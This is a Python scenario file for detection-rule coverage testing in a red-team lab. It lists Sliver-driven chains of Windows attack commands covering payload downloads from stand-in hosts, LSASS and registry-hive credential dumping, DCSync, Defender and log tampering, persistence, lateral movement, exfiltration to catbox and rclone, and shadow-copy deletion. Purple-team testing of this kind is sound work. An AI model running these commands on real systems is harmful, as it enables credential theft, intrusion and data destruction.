"""
Scenario chains for breadth-focused rule testing.

Each scenario is an ordered list of Sliver operations that collectively
exercise one family of Windows detection rules. The `expected_scenario_ids`
field maps to the scenario_id column in coverage_map.csv — after a run,
we diff expected-fired against actually-fired.

Schema for each step:
  name         short label
  kind         one of: execute | execute_assembly | native | shell | registry
                       | upload | noop
  command      what to run (binary path for execute, assembly name for
               execute_assembly, Sliver native command for native)
  args         list of arguments
  notes        human-readable explanation
  atck         optional MITRE technique ID (e.g. "T1059.001")

IMPORTANT: these are lab-only. Do not run against production hosts. Every
command here is an artefact of red-team simulation against monitored VMs.
"""

# Each scenario: (id, description, steps)
SCENARIOS = {

# ─────────────────────────────────────────────────────────────────────────────
"S1_initial_recon": {
    "description": "Initial access artefacts + LOLBin staging + host/AD recon",
    "expected_scenario_ids": ["S1_initial_recon"],
    "steps": [
        # --- office-like staging via LOLBins (simulates macro payload) ------
        {"name": "mshta_remote_hta", "kind": "shell", "atck": "T1218.005",
         "command": "mshta.exe", "args": ["https://lab.local/payload.hta"],
         "notes": "Triggers mshta-with-URL rules"},
        {"name": "regsvr32_scrobj", "kind": "shell", "atck": "T1218.010",
         "command": "regsvr32.exe",
         "args": ["/s", "/u", "/n", "/i:https://lab.local/x.sct", "scrobj.dll"],
         "notes": "Classic Squiblydoo"},
        {"name": "installutil_download", "kind": "shell", "atck": "T1218.004",
         "command": "installutil.exe", "args": ["/logfile=", "/LogToConsole=false", "/U", "C:\\Temp\\payload.exe"]},
        {"name": "certutil_urlcache", "kind": "shell", "atck": "T1105",
         "command": "certutil.exe", "args": ["-urlcache", "-split", "-f", "http://1.2.3.4/a.exe", "a.exe"]},
        {"name": "bitsadmin_transfer", "kind": "shell", "atck": "T1197",
         "command": "bitsadmin.exe", "args": ["/transfer", "job1", "http://lab.local/b.exe", "C:\\Temp\\b.exe"]},
        {"name": "msiexec_remote", "kind": "shell", "atck": "T1218.007",
         "command": "msiexec.exe", "args": ["/quiet", "/i", "http://lab.local/x.msi"]},
        # --- host recon --------------------------------------------------
        {"name": "whoami_all", "kind": "native", "atck": "T1033",
         "command": "execute", "args": ["-o", "whoami", "/all"]},
        {"name": "systeminfo", "kind": "native", "atck": "T1082",
         "command": "execute", "args": ["-o", "systeminfo"]},
        {"name": "net_user", "kind": "native", "atck": "T1087.001",
         "command": "execute", "args": ["-o", "net", "user"]},
        {"name": "net_localgroup_admins", "kind": "native", "atck": "T1069.001",
         "command": "execute", "args": ["-o", "net", "localgroup", "administrators"]},
        {"name": "net_group_domadmins", "kind": "native", "atck": "T1069.002",
         "command": "execute", "args": ["-o", "net", "group", "Domain Admins", "/domain"]},
        {"name": "net_view_shares", "kind": "native", "atck": "T1135",
         "command": "execute", "args": ["-o", "net", "view", "/all", "\\\\dc01"]},
        {"name": "nltest_dclist", "kind": "native", "atck": "T1018",
         "command": "execute", "args": ["-o", "nltest", "/dclist:"]},
        {"name": "quser", "kind": "native", "atck": "T1033",
         "command": "execute", "args": ["-o", "quser"]},
        {"name": "tasklist_svc", "kind": "native", "atck": "T1057",
         "command": "execute", "args": ["-o", "tasklist", "/svc"]},
        # --- AD recon (BYOT) --------------------------------------------
        {"name": "adfind_users", "kind": "execute_assembly", "atck": "T1087.002",
         "command": "AdFind.exe", "args": ["-f", "objectcategory=user", "-csv"],
         "notes": "Requires AdFind.exe in loot — delete on cleanup"},
        {"name": "sharphound_collect", "kind": "execute_assembly", "atck": "T1482",
         "command": "SharpHound.exe", "args": ["-c", "DCOnly", "--zipfilename", "sh.zip"]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S2_credential_theft": {
    "description": "LSASS dump, registry hive theft, Kerberoast, DCSync, DPAPI",
    "expected_scenario_ids": ["S2_credential_theft"],
    "steps": [
        # LSASS dumping techniques
        {"name": "comsvcs_minidump", "kind": "shell", "atck": "T1003.001",
         "command": "rundll32.exe",
         "args": ["C:\\Windows\\System32\\comsvcs.dll", "MiniDump", "<LSASS_PID>", "C:\\Temp\\l.dmp", "full"]},
        {"name": "procdump_lsass", "kind": "execute_assembly", "atck": "T1003.001",
         "command": "procdump.exe", "args": ["-ma", "lsass.exe", "C:\\Temp\\lsass.dmp"]},
        {"name": "taskmgr_lsass_dump", "kind": "shell", "atck": "T1003.001",
         "command": "taskmgr.exe", "args": [], "notes": "Manual: right-click lsass → Create dump"},
        # Registry hive dump
        {"name": "reg_save_sam", "kind": "shell", "atck": "T1003.002",
         "command": "reg.exe", "args": ["save", "HKLM\\SAM", "C:\\Temp\\sam.hiv"]},
        {"name": "reg_save_system", "kind": "shell", "atck": "T1003.002",
         "command": "reg.exe", "args": ["save", "HKLM\\SYSTEM", "C:\\Temp\\system.hiv"]},
        {"name": "reg_save_security", "kind": "shell", "atck": "T1003.002",
         "command": "reg.exe", "args": ["save", "HKLM\\SECURITY", "C:\\Temp\\security.hiv"]},
        # NTDS via VSS
        {"name": "vssadmin_create", "kind": "shell", "atck": "T1003.003",
         "command": "vssadmin.exe", "args": ["create", "shadow", "/for=C:"]},
        {"name": "copy_ntds", "kind": "shell", "atck": "T1003.003",
         "command": "cmd.exe", "args": ["/c", "copy", "\\\\?\\GLOBALROOT\\...\\ntds.dit", "C:\\Temp\\ntds.dit"]},
        # Kerberoast / AS-REP
        {"name": "rubeus_kerberoast", "kind": "execute_assembly", "atck": "T1558.003",
         "command": "Rubeus.exe", "args": ["kerberoast", "/nowrap", "/outfile:tgs.txt"]},
        {"name": "rubeus_asreproast", "kind": "execute_assembly", "atck": "T1558.004",
         "command": "Rubeus.exe", "args": ["asreproast", "/format:hashcat", "/outfile:asrep.txt"]},
        # DCSync (if DA in lab)
        {"name": "mimikatz_dcsync", "kind": "execute_assembly", "atck": "T1003.006",
         "command": "mimikatz.exe", "args": ['"lsadump::dcsync /domain:lab.local /user:krbtgt"', "exit"]},
        # DPAPI
        {"name": "mimikatz_dpapi", "kind": "execute_assembly", "atck": "T1555.003",
         "command": "mimikatz.exe", "args": ['"dpapi::masterkey /in:..."', "exit"]},
        # Browser creds
        {"name": "copy_chrome_login_data", "kind": "shell", "atck": "T1555.003",
         "command": "cmd.exe", "args": ["/c", "copy", "%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Login Data", "C:\\Temp\\"]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S3_privesc": {
    "description": "UAC bypass, named-pipe impersonation, token theft, accessibility hijack",
    "expected_scenario_ids": ["S3_privesc"],
    "steps": [
        {"name": "uac_fodhelper", "kind": "shell", "atck": "T1548.002",
         "command": "reg.exe",
         "args": ["add", "HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "/ve", "/d", "cmd.exe", "/f"],
         "notes": "Combined with fodhelper.exe invocation to trigger UAC bypass rules"},
        {"name": "uac_eventvwr", "kind": "shell", "atck": "T1548.002",
         "command": "reg.exe",
         "args": ["add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/ve", "/d", "cmd.exe", "/f"]},
        {"name": "uac_sdclt", "kind": "shell", "atck": "T1548.002",
         "command": "reg.exe",
         "args": ["add", "HKCU\\Software\\Classes\\Folder\\shell\\open\\command", "/ve", "/d", "cmd.exe", "/f"]},
        {"name": "sliver_getsystem", "kind": "native", "atck": "T1134.001",
         "command": "getsystem", "args": [],
         "notes": "Sliver's named-pipe impersonation — triggers named-pipe-impersonation rules"},
        {"name": "sliver_steal_token", "kind": "native", "atck": "T1134.001",
         "command": "impersonate", "args": ["DOMAIN\\Administrator"]},
        {"name": "accessibility_hijack", "kind": "shell", "atck": "T1546.008",
         "command": "reg.exe",
         "args": ["add", r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe",
                  "/v", "Debugger", "/d", "cmd.exe", "/f"]},
        {"name": "magnify_debugger", "kind": "shell", "atck": "T1546.008",
         "command": "reg.exe",
         "args": ["add", r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe",
                  "/v", "Debugger", "/d", "cmd.exe", "/f"]},
        {"name": "cmstp_bypass", "kind": "shell", "atck": "T1218.003",
         "command": "cmstp.exe", "args": ["/s", "C:\\Temp\\malicious.inf"]},
        # Vulnerable driver (BYOVD)
        {"name": "vuln_driver_load", "kind": "execute_assembly", "atck": "T1068",
         "command": "sc.exe", "args": ["create", "vulndrv", "binpath=", "C:\\Temp\\gdrv.sys", "type=", "kernel"],
         "notes": "BYOVD — add a known-vulnerable signed driver"},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S4_defense_evasion": {
    "description": "AMSI/ETW bypass, defender tampering, log clearing, LOLBin evasion",
    "expected_scenario_ids": ["S4_defense_evasion"],
    "steps": [
        {"name": "amsi_bypass_patch", "kind": "execute_assembly", "atck": "T1562.001",
         "command": "powershell.exe",
         "args": ["-ep", "bypass", "-c", "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')..."],
         "notes": "Canonical AmsiUtils reflection — triggers amsi-bypass rules"},
        {"name": "etw_patch", "kind": "execute_assembly", "atck": "T1562.006",
         "command": "SharpEtwPatch.exe", "args": []},
        {"name": "defender_disable_rtp", "kind": "shell", "atck": "T1562.001",
         "command": "powershell.exe",
         "args": ["-c", "Set-MpPreference -DisableRealtimeMonitoring $true"]},
        {"name": "defender_exclusion_path", "kind": "shell", "atck": "T1562.001",
         "command": "powershell.exe",
         "args": ["-c", "Add-MpPreference -ExclusionPath 'C:\\Temp'"]},
        {"name": "defender_tamper_reg", "kind": "shell", "atck": "T1562.001",
         "command": "reg.exe",
         "args": ["add", r"HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "/v", "DisableAntiSpyware", "/t", "REG_DWORD", "/d", "1", "/f"]},
        {"name": "clear_security_log", "kind": "shell", "atck": "T1070.001",
         "command": "wevtutil.exe", "args": ["cl", "Security"]},
        {"name": "clear_sysmon_log", "kind": "shell", "atck": "T1070.001",
         "command": "wevtutil.exe", "args": ["cl", "Microsoft-Windows-Sysmon/Operational"]},
        {"name": "disable_firewall", "kind": "shell", "atck": "T1562.004",
         "command": "netsh.exe", "args": ["advfirewall", "set", "allprofiles", "state", "off"]},
        {"name": "netsh_port_proxy", "kind": "shell", "atck": "T1090",
         "command": "netsh.exe", "args": ["interface", "portproxy", "add", "v4tov4", "listenport=3389", "connectaddress=1.2.3.4"]},
        # LOLBin execution variants
        {"name": "rundll32_javascript", "kind": "shell", "atck": "T1218.011",
         "command": "rundll32.exe", "args": ["javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()..."]},
        {"name": "register_cimprovider", "kind": "shell", "atck": "T1218",
         "command": "register-cimprovider.exe", "args": ["-path", "C:\\Temp\\evil.dll"]},
        {"name": "pcwrun_bypass", "kind": "shell", "atck": "T1218",
         "command": "pcwrun.exe", "args": ["/", "/", "cmd.exe"]},
        # Obfuscation
        {"name": "base64_encoded_ps", "kind": "shell", "atck": "T1027",
         "command": "powershell.exe", "args": ["-ep", "bypass", "-e", "PAB...base64..."]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S5_persistence": {
    "description": "Run keys, services, scheduled tasks, WMI subs, DLL sideloading, IFEO",
    "expected_scenario_ids": ["S5_persistence"],
    "steps": [
        {"name": "run_key_hkcu", "kind": "shell", "atck": "T1547.001",
         "command": "reg.exe",
         "args": ["add", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "updater", "/d", "C:\\Temp\\i.exe", "/f"]},
        {"name": "run_key_hklm", "kind": "shell", "atck": "T1547.001",
         "command": "reg.exe",
         "args": ["add", r"HKLM\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "svc", "/d", "C:\\Temp\\i.exe", "/f"]},
        {"name": "startup_folder_lnk", "kind": "shell", "atck": "T1547.001",
         "command": "cmd.exe", "args": ["/c", "copy", "C:\\Temp\\i.lnk",
                                         "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"]},
        {"name": "scheduled_task_create", "kind": "shell", "atck": "T1053.005",
         "command": "schtasks.exe",
         "args": ["/create", "/sc", "onlogon", "/tn", "Updater", "/tr", "C:\\Temp\\i.exe", "/rl", "HIGHEST", "/f"]},
        {"name": "service_install", "kind": "shell", "atck": "T1543.003",
         "command": "sc.exe",
         "args": ["create", "evilsvc", "binpath=", "C:\\Temp\\i.exe", "start=", "auto"]},
        {"name": "wmi_event_subscription", "kind": "execute_assembly", "atck": "T1546.003",
         "command": "powershell.exe",
         "args": ["-c", "$f=Set-WmiInstance -Class __EventFilter -Namespace root\\subscription ..."]},
        {"name": "com_hijack_clsid", "kind": "shell", "atck": "T1546.015",
         "command": "reg.exe",
         "args": ["add", r"HKCU\Software\Classes\CLSID\{...}\InProcServer32", "/ve", "/d", "C:\\Temp\\evil.dll", "/f"]},
        {"name": "dll_sideload_drop", "kind": "upload", "atck": "T1574.002",
         "command": "onedrive.exe sideload dir",
         "args": ["version.dll"],
         "notes": "Drop a side-loadable DLL next to a legit signed exe and run it"},
        {"name": "ifeo_debugger", "kind": "shell", "atck": "T1546.012",
         "command": "reg.exe",
         "args": ["add", r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe",
                  "/v", "Debugger", "/d", "C:\\Temp\\i.exe", "/f"]},
        {"name": "bits_persistent_job", "kind": "shell", "atck": "T1197",
         "command": "bitsadmin.exe",
         "args": ["/create", "b1", "&&", "bitsadmin.exe", "/setnotifycmdline", "b1", "C:\\Temp\\i.exe", "NULL"]},
        {"name": "appinit_dll", "kind": "shell", "atck": "T1546.010",
         "command": "reg.exe",
         "args": ["add", r"HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows", "/v", "AppInit_DLLs", "/d", "C:\\Temp\\i.dll", "/f"]},
        {"name": "shim_database", "kind": "shell", "atck": "T1546.011",
         "command": "sdbinst.exe", "args": ["-q", "C:\\Temp\\evil.sdb"]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S6_lateral": {
    "description": "PSExec, WMI exec, WinRM, SMB/admin share abuse, DCOM",
    "expected_scenario_ids": ["S6_lateral"],
    "steps": [
        {"name": "sliver_psexec", "kind": "native", "atck": "T1569.002",
         "command": "psexec", "args": ["-t", "<target-session>", "-s", "beacon.exe"]},
        {"name": "psexec_native", "kind": "execute_assembly", "atck": "T1569.002",
         "command": "PsExec.exe", "args": ["\\\\target", "-s", "cmd.exe"]},
        {"name": "wmic_node_exec", "kind": "shell", "atck": "T1047",
         "command": "wmic.exe",
         "args": ["/node:target", "process", "call", "create", "cmd.exe /c whoami > C:\\Temp\\o.txt"]},
        {"name": "invoke_wmimethod", "kind": "shell", "atck": "T1047",
         "command": "powershell.exe",
         "args": ["-c", "Invoke-WmiMethod -ComputerName target -Class Win32_Process -Name Create -ArgumentList 'cmd.exe /c whoami'"]},
        {"name": "winrm_invoke_command", "kind": "shell", "atck": "T1021.006",
         "command": "powershell.exe",
         "args": ["-c", "Invoke-Command -ComputerName target -ScriptBlock {whoami}"]},
        {"name": "new_pssession", "kind": "shell", "atck": "T1021.006",
         "command": "powershell.exe",
         "args": ["-c", "Enter-PSSession -ComputerName target"]},
        {"name": "smb_admin_share_copy", "kind": "shell", "atck": "T1021.002",
         "command": "cmd.exe", "args": ["/c", "copy", "C:\\Temp\\i.exe", "\\\\target\\C$\\Windows\\Temp\\"]},
        {"name": "dcom_excel", "kind": "execute_assembly", "atck": "T1021.003",
         "command": "powershell.exe",
         "args": ["-c", "[activator]::CreateInstance([type]::GetTypeFromProgID('Excel.Application','target'))..."]},
        {"name": "rdp_enable_remote", "kind": "shell", "atck": "T1021.001",
         "command": "reg.exe",
         "args": ["add", r"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server", "/v", "fDenyTSConnections", "/t", "REG_DWORD", "/d", "0", "/f"]},
        {"name": "impacket_atexec", "kind": "execute_assembly", "atck": "T1053.002",
         "command": "atexec.py", "args": ["domain/user:pass@target", "whoami"]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S7_c2_exfil": {
    "description": "Sliver DNS/HTTPS beacons, port forward, SOCKS, RMM abuse, exfil tools",
    "expected_scenario_ids": ["S7_c2_exfil"],
    "steps": [
        {"name": "sliver_dns_beacon", "kind": "native", "atck": "T1071.004",
         "command": "generate beacon", "args": ["--dns", "c2.lab.local", "--os", "windows"]},
        {"name": "sliver_https_beacon", "kind": "native", "atck": "T1071.001",
         "command": "generate beacon", "args": ["--https", "lab.local", "--os", "windows"]},
        {"name": "sliver_portfwd", "kind": "native", "atck": "T1090",
         "command": "portfwd", "args": ["add", "--remote", "127.0.0.1:3389", "--bind", "0.0.0.0:13389"]},
        {"name": "sliver_socks5", "kind": "native", "atck": "T1090",
         "command": "socks5", "args": ["start"]},
        {"name": "cloudflared_tunnel", "kind": "shell", "atck": "T1572",
         "command": "cloudflared.exe", "args": ["tunnel", "--url", "http://127.0.0.1:3389"]},
        {"name": "ngrok_tcp", "kind": "shell", "atck": "T1572",
         "command": "ngrok.exe", "args": ["tcp", "3389"]},
        {"name": "powershell_downloadstring", "kind": "shell", "atck": "T1105",
         "command": "powershell.exe",
         "args": ["-c", "IEX(New-Object Net.WebClient).DownloadString('http://1.2.3.4/p.ps1')"]},
        {"name": "bitsadmin_download", "kind": "shell", "atck": "T1105",
         "command": "bitsadmin.exe", "args": ["/transfer", "n", "http://1.2.3.4/x", "C:\\Temp\\x"]},
        # RMM abuse
        {"name": "anydesk_silent", "kind": "shell", "atck": "T1219",
         "command": "AnyDesk.exe", "args": ["--silent", "--start-with-win"]},
        {"name": "teamviewer_unattended", "kind": "shell", "atck": "T1219",
         "command": "TeamViewer.exe", "args": ["--Silent", "--Unattended"]},
        {"name": "netsupport_drop", "kind": "upload", "atck": "T1219",
         "command": "client32.exe", "args": []},
        # Exfil
        {"name": "rclone_copy_s3", "kind": "shell", "atck": "T1567.002",
         "command": "rclone.exe", "args": ["copy", "C:\\Loot", "remote:bucket", "--max-age", "1y"]},
        {"name": "curl_upload_catbox", "kind": "shell", "atck": "T1567.001",
         "command": "curl.exe", "args": ["-F", "fileToUpload=@C:\\Loot\\data.zip", "https://catbox.moe/user/api.php"]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S8_impact": {
    "description": "Shadow copy deletion, backup deletion, recovery disable",
    "expected_scenario_ids": ["S8_impact"],
    "steps": [
        {"name": "vssadmin_delete", "kind": "shell", "atck": "T1490",
         "command": "vssadmin.exe", "args": ["delete", "shadows", "/all", "/quiet"]},
        {"name": "wmic_shadow_delete", "kind": "shell", "atck": "T1490",
         "command": "wmic.exe", "args": ["shadowcopy", "delete", "/nointeractive"]},
        {"name": "ps_shadow_delete", "kind": "shell", "atck": "T1490",
         "command": "powershell.exe",
         "args": ["-c", "Get-WmiObject Win32_ShadowCopy | ForEach-Object { $_.Delete() }"]},
        {"name": "bcdedit_recovery_off", "kind": "shell", "atck": "T1490",
         "command": "bcdedit.exe", "args": ["/set", "{default}", "recoveryenabled", "No"]},
        {"name": "bcdedit_bootstatuspolicy", "kind": "shell", "atck": "T1490",
         "command": "bcdedit.exe", "args": ["/set", "{default}", "bootstatuspolicy", "ignoreallfailures"]},
        {"name": "wbadmin_delete_catalog", "kind": "shell", "atck": "T1490",
         "command": "wbadmin.exe", "args": ["delete", "catalog", "-quiet"]},
        {"name": "wbadmin_delete_backup", "kind": "shell", "atck": "T1490",
         "command": "wbadmin.exe", "args": ["delete", "backup", "-keepVersions:0"]},
        {"name": "resize_shadowstorage", "kind": "shell", "atck": "T1490",
         "command": "vssadmin.exe", "args": ["resize", "shadowstorage", "/for=C:", "/on=C:", "/maxsize=401MB"]},
    ],
},

# ─────────────────────────────────────────────────────────────────────────────
"S9_lolbin_generic": {
    "description": "Broad sweep: run as many signed-binary LOLBins as possible to "
                   "exercise the long tail of proc_creation rules",
    "expected_scenario_ids": ["S9_lolbin_generic", "S4_defense_evasion"],
    "steps": [
        {"name": "odbcconf_dll", "kind": "shell", "atck": "T1218",
         "command": "odbcconf.exe", "args": ["/a", "{regsvr c:\\temp\\x.dll}"]},
        {"name": "pcalua_exec", "kind": "shell", "atck": "T1218",
         "command": "pcalua.exe", "args": ["-a", "C:\\Temp\\i.exe"]},
        {"name": "forfiles_cmd", "kind": "shell", "atck": "T1202",
         "command": "forfiles.exe", "args": ["/p", "C:\\Windows", "/m", "notepad.exe", "/c", "cmd /c whoami"]},
        {"name": "mavinject_pid", "kind": "shell", "atck": "T1055",
         "command": "mavinject.exe", "args": ["<PID>", "/INJECTRUNNING", "C:\\Temp\\i.dll"]},
        {"name": "xwizard_hijack", "kind": "shell", "atck": "T1218",
         "command": "xwizard.exe", "args": ["RunWizard", "{00000000-0000-0000-0000-000000000000}"]},
        {"name": "makecab_stage", "kind": "shell", "atck": "T1027",
         "command": "makecab.exe", "args": ["C:\\Temp\\a.exe", "C:\\Temp\\a.cab"]},
        {"name": "expand_unpack", "kind": "shell", "atck": "T1140",
         "command": "expand.exe", "args": ["-r", "C:\\Temp\\a.cab", "-F:*", "C:\\Temp"]},
        {"name": "extrac32_cab", "kind": "shell", "atck": "T1140",
         "command": "extrac32.exe", "args": ["/Y", "/E", "C:\\Temp\\a.cab"]},
        {"name": "syncappv", "kind": "shell", "atck": "T1218",
         "command": "SyncAppvPublishingServer.exe", "args": ["n;(New-Object Net.WebClient).DownloadString('...')"]},
        {"name": "addinutil_abuse", "kind": "shell", "atck": "T1218",
         "command": "AddInUtil.exe", "args": ["-AddInRoot:C:\\Temp"]},
        {"name": "cmstp_inf", "kind": "shell", "atck": "T1218.003",
         "command": "cmstp.exe", "args": ["/s", "/ns", "C:\\Temp\\evil.inf"]},
        {"name": "werfault_reflect", "kind": "shell", "atck": "T1574",
         "command": "WerFault.exe", "args": ["-u", "-p", "<PID>"]},
    ],
},

}

# Meta: ordering when running --all.  Put initial/recon first, impact last.
SCENARIO_ORDER = [
    "S1_initial_recon",
    "S4_defense_evasion",
    "S3_privesc",
    "S2_credential_theft",
    "S5_persistence",
    "S6_lateral",
    "S7_c2_exfil",
    "S9_lolbin_generic",
    "S8_impact",
]
